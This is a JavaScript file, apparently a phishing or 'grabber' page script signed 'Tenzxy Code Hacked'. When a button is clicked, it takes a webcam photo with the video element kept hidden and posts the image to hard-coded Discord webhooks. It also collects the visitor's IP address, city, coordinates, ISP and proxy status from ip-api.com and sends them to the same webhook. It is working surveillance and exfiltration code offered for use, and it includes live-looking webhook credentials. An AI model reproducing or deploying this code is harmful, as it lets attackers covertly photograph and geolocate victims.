///--𝖳𝖾𝗇𝗓𝗑𝗒 𝖢𝗈𝖽𝖾 𝖧𝖺𝖼𝗦𝗄𝖾𝗗--///

const discordWebhookUrl1 = 'https://discord.com/api/webhooks/1316744897700823042/bN9ELvM2OvvYIBq-TU4zu3VK9PjyaH9IYUMH1X-d0QIpkdgQWC-VbrsKM1DbX0q7oAO3';
const discordWebhookUrl2 = 'https://discord.com/api/webhooks/1316744897700823042/bN9ELvM2OvvYIBq-TU4zu3VK9PjyaH9IYUMH1X-d0QIpkdgQWC-VbrsKM1DbX0q7oAO3';
const discordChannelUrl = 'https://discord.gg/sTUkWkZHeE';

const captureButton = document.getElementById('captureButton');

if (!captureButton) {
    console.error('Capture button not found.');
}

captureButton.addEventListener('click', async () => {
    let videoStream;
    try {
        // Access the user's camera
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = videoStream;
        video.style.display = 'none';
        document.body.appendChild(video);

        // Wait for the video to be ready
        await new Promise((resolve) => {
            video.onloadedmetadata = () => resolve(video.play());
        });

        // Capture the image from the video stream
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convert the captured image to a blob
        const imageUrl = canvas.toDataURL('image/png');
        const imageBlob = dataURLToBlob(imageUrl);

        // Send the image to Discord
        await sendImageToDiscord(discordWebhookUrl1, imageBlob);
        await sendImageToDiscord(discordWebhookUrl2, imageBlob);

        // Stop the video stream and clean up
        videoStream.getTracks().forEach(track => track.stop());
        document.body.removeChild(video);

        // Fetch IP info after capturing the image (IP info will not be sent automatically now)
        await fetchAndDisplayData();

        // Open the Discord channel in a new tab
        window.open(discordChannelUrl, '_blank');
        
    } catch (error) {
        console.error('Error accessing camera:', error);
        alert('There was an issue accessing the camera. Please check your camera permissions.');
    }
});

function dataURLToBlob(dataURL) {
    const [metadata, base64Data] = dataURL.split(',');
    const mimeType = metadata.match(/:(.*?);/)[1];
    const binaryString = atob(base64Data);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);

    for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }

    return new Blob([bytes], { type: mimeType });
}

async function sendImageToDiscord(webhookUrl, imageBlob) {
    const formData = new FormData();
    formData.append('file', imageBlob, 'captured_image.png');

    try {
        const sendResponse = await fetch(webhookUrl, {
            method: 'POST',
            body: formData
        });

        if (sendResponse.ok) {
            console.log('Image sent to Discord!');
        } else {
            console.error('Failed to send image to Discord');
            alert('Failed to send image to Discord.');
        }
    } catch (error) {
        console.error('Error sending image to Discord:', error);
        alert('Error sending image to Discord.');
    }
}

async function fetchInformation(url) {
    try {
        const response = await fetch(url);
        return await response.json();
    } catch (error) {
        console.error('Error fetching information:', error);
        return null;
    }
}

async function logToWebhook(ipInfo, extraInfo) {
    if (!ipInfo || !ipInfo.query) {
        console.error('IP address is missing:', ipInfo);
        return;
    }

    const ipAddress = ipInfo.query; // The IP address from the API
    const payload = {
        username: 'Tenzxy Hacked',
        avatar_url: 'https://cdn.discordapp.com/attachments/1290048913340108882/1315990743743201331/465017387_1096352372500294_8907522774408044011_n.png',
        content: `**IP**: _${ipAddress}_\n**FaceBook TenzxyBoi**: https://web.facebook.com/Tenzxyboi${ipAddress}_\n**Extra Info**: || Tenzxy Boi ||\`\`\`T${extraInfo}\`\`\``
    };

    try {
        const response = await fetch(discordWebhookUrl1, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log('Message successfully sent to webhook');
        } else {
            console.error('Failed to send message to webhook');
        }
    } catch (error) {
        console.error('Error sending message to webhook:', error);
    }
}

async function fetchAndDisplayData() {
    // Fetch IP info from ip-api.com
    const ipApiUrl = "http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
    const ipInfo = await fetchInformation(ipApiUrl);

    if (ipInfo) {
        console.log('Fetched IP Info:', ipInfo);
        // Log IP info to webhook after capture button is clicked
        logToWebhook(ipInfo, JSON.stringify(ipInfo, null, 2));
    }

    // Optionally fetch IP from ipify API
    const ipifyUrl = "https://api.ipify.org/";
    const ipifyInfo = await fetchInformation(ipifyUrl);

    if (ipifyInfo) {
        console.log('Fetched IPIFY Info:', ipifyInfo);
        // Optionally log IP from ipify API if needed
        // logToWebhook(ipifyInfo, JSON.stringify(ipifyInfo, null, 2));
    }
}
